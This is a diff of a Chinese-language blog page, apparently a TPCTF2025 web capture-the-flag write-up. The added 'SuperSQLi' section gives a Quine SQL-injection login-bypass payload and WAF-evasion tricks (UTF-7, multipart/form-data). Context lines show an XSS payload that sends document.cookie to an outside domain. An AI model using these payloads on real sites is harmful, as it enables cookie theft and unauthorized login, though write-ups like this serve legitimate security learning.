@@ -13,13 +13,16 @@
 <meta property="og:site_name" content="Kamiya 的小窝">
 <meta property="og:description" content="TPCTF2025 Web 复现全解baby-layoutProblem本题给了两个接口，允许我们自定义 layout 然后能够自定义 &#123;&#123;content&#125;&#125; 内容。 Solution登录之后发现有一个网页和 bot 功能，疑似 xss，看到 dockerfile 里面 flag 放到 bot 的 cookie 里，大概是要把 bot 的 cookie 带出">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250401204836527.png">
+<meta property="og:image" content="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250401204816090.png">
 <meta property="article:published_time" content="2025-03-31T14:01:28.000Z">
-<meta property="article:modified_time" content="2025-03-31T14:30:40.935Z">
+<meta property="article:modified_time" content="2025-04-04T11:18:15.509Z">
 <meta property="article:author" content="Kamiya">
 <meta property="article:tag" content="xctf">
 <meta property="article:tag" content="writeup">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250401204836527.png">
     
     
       
@@ -102,6 +105,8 @@
     <span id="actions">
       <ul>
         
+        <li><a class="icon" aria-label="上一篇" href="/2025/03/31/jnctf-wp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
@@ -131,7 +136,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TPCTF2025-Web-%E5%A4%8D%E7%8E%B0%E5%85%A8%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">TPCTF2025 Web 复现全解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-layout"><span class="toc-number">1.1.</span> <span class="toc-text">baby-layout</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Problem"><span class="toc-number">1.1.1.</span> <span class="toc-text">Problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution"><span class="toc-number">1.1.2.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Safe-layout"><span class="toc-number">1.2.</span> <span class="toc-text">Safe-layout</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Problem-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">Solution</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TPCTF2025-Web-%E5%A4%8D%E7%8E%B0%E5%85%A8%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">TPCTF2025 Web 复现全解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-layout"><span class="toc-number">1.1.</span> <span class="toc-text">baby-layout</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Problem"><span class="toc-number">1.1.1.</span> <span class="toc-text">Problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution"><span class="toc-number">1.1.2.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Safe-layout"><span class="toc-number">1.2.</span> <span class="toc-text">Safe-layout</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Problem-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SuperSQLi"><span class="toc-number">1.3.</span> <span class="toc-text">SuperSQLi</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Problem-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">Problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">Solution</span></a></li></ol></li></ol></li></ol>
       </div>
     
   </span>
@@ -207,6 +212,19 @@
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">img src onerror=fetch(`domain.com/?flag=`+document.cookie) <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>后面的 <code>&lt;style&gt;</code> 帮助我们展平弹出，前面的 <code>img</code> 是我们的恶意注入代码。</p>
+<h2 id="SuperSQLi"><a href="#SuperSQLi" class="headerlink" title="SuperSQLi"></a>SuperSQLi</h2><h3 id="Problem-2"><a href="#Problem-2" class="headerlink" title="Problem"></a>Problem</h3><p>给了一个纯粹的 sql 查询，并且开启了一个反向代理服务对所有上传到服务器的请求进行了检测。</p>
+<p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250401204836527.png" alt="image-20250401204836527"></p>
+<p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250401204816090.png" alt="image-20250401204816090"></p>
+<h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p>两种手法过掉这个 waf，可以在上传 payload 时使用 utf-7 编码进行 bypass，在 Django &lt; 0.5 版本时存在协议层 waf 绕过，具体的文章还没有详细看，如果有时间的话去详细了解一下原理吧。</p>
+<p>通过这个漏洞我们可以任意构造 payload，并且对方的 sql 查询点并没有经过任何的预编译或者返回值防护，所以我们可以直接任意命令注入。</p>
+<p>但是打开数据库之后发现用户库其实是空的，也就是说不存在一种可能使我们登录成功，也就是说 <code>admin</code> 的密码根本就不存在。所以我们得尝试直接绕过：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span> password == users[<span class="number">0</span>].password</span><br></pre></td></tr></table></figure>
+
+<p>其实非常简单，我们只需要让我们的 sql 查询返回语句等于我们注入的 password 语句就行了，这非常像之前在小学二年级学过的输出自身的 C++ 代码。在 sql 中叫 <strong>Quine SQLi</strong>，自生产程序 sql 注入。（如果之后有时间我会写一篇该 trick 相关的文章）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;UNION SELECT 1,&#x27;admin&#x27;,REPLACE(REPLACE(&#x27;&quot;UNION SELECT 1,&quot;admin&quot;,REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;);-- &#x27;,CHAR(34),CHAR(39)),CHAR(36),&#x27;&quot;UNION SELECT 1,&quot;admin&quot;,REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;);-- &#x27;);--</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>password</code> 处注入该 payload 即可。</p>
+<p>另一个绕过手法是来自于星盟的 writeup。在解析 post 包的时候，waf 程序会对不同的 <code>content-type</code> 进行区分，当 <code>content-type=multipart/form-data</code> 时，我们发送一个 <code>data</code> 包里面加上我们需要的 <code>post</code> 体，这样就能够直接绕过这个 waf 的检测了。（这里其实没太懂，后面我再去琢磨琢磨）</p>
 
   </div>
 </article>
@@ -242,7 +260,7 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TPCTF2025-Web-%E5%A4%8D%E7%8E%B0%E5%85%A8%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">TPCTF2025 Web 复现全解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-layout"><span class="toc-number">1.1.</span> <span class="toc-text">baby-layout</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Problem"><span class="toc-number">1.1.1.</span> <span class="toc-text">Problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution"><span class="toc-number">1.1.2.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Safe-layout"><span class="toc-number">1.2.</span> <span class="toc-text">Safe-layout</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Problem-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">Solution</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TPCTF2025-Web-%E5%A4%8D%E7%8E%B0%E5%85%A8%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">TPCTF2025 Web 复现全解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-layout"><span class="toc-number">1.1.</span> <span class="toc-text">baby-layout</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Problem"><span class="toc-number">1.1.1.</span> <span class="toc-text">Problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution"><span class="toc-number">1.1.2.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Safe-layout"><span class="toc-number">1.2.</span> <span class="toc-text">Safe-layout</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Problem-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SuperSQLi"><span class="toc-number">1.3.</span> <span class="toc-text">SuperSQLi</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Problem-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">Problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">Solution</span></a></li></ol></li></ol></li></ol>
       </div>
     
 
